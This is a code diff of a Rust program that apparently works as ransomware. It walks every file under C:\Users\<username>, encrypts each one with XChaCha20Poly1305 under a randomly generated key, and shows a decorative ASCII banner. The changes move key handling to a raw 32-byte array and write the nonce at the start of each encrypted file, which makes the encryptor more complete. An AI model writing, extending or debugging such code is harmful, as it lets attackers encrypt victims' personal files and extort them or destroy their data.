@@ -2,7 +2,7 @@
 
 use chacha20poly1305::{
     aead::{stream, KeyInit, OsRng},
-    Key, XChaCha20Poly1305,
+    XChaCha20Poly1305,
 };
 use rand::RngCore;
 use std::{
@@ -31,7 +31,7 @@ static COOL_TEXT: &str = r#"    __    __  __    __  __        __    __   ______ 
    $$    $$/ $$ | $$$ |$$       |$$    $$/ $$    $$/ $$ | $$  |$$       |
     $$$$$$/  $$/   $$/ $$$$$$$$/  $$$$$$/   $$$$$$/  $$/   $$/ $$$$$$$$/"#;
 
-fn runFile(sourceFilePath: &str, key: &Key) -> Result<(), io::Error> {
+fn runFile(sourceFilePath: &str, key: &[u8; 32]) -> Result<(), io::Error> {
     if sourceFilePath == "" {
         return Ok(());
     }
@@ -62,13 +62,17 @@ fn runFile(sourceFilePath: &str, key: &Key) -> Result<(), io::Error> {
     let mut nonce = [0u8; 19];
     OsRng.fill_bytes(&mut nonce);
 
-    let aead = XChaCha20Poly1305::new(key);
+    let aead = XChaCha20Poly1305::new(key.as_ref().into());
     let mut streamEncryptor = stream::EncryptorBE32::from_aead(aead, nonce.as_ref().into());
 
     const BUFFER_LEN: usize = 500;
     let mut buffer = [0u8; BUFFER_LEN];
 
     let mut distFile = File::create(destinationFilePath)?;
+    match distFile.write_all(&nonce) {
+        Ok(_) => (),
+        Err(_) => return Ok(()),
+    };
 
     loop {
         let read_count = sourceFile.read(&mut buffer)?;
@@ -101,7 +105,7 @@ fn runFile(sourceFilePath: &str, key: &Key) -> Result<(), io::Error> {
     Ok(())
 }
 
-fn runDirEntry(dirEntryPath: &str, key: &Key) {
+fn runDirEntry(dirEntryPath: &str, key: &[u8; 32]) {
     let metadata = match metadata(dirEntryPath) {
         Ok(metadata) => metadata,
         Err(_) => return,
@@ -142,7 +146,8 @@ fn main() {
         Err(_) => panic!("No username set"),
     };
 
-    let key = XChaCha20Poly1305::generate_key(&mut OsRng);
+    let mut key = [0u8; 32];
+    OsRng.fill_bytes(&mut key);
 
     let mut entryPath: String = r#"C:\Users\"#.to_string();
     entryPath.push_str(&username);
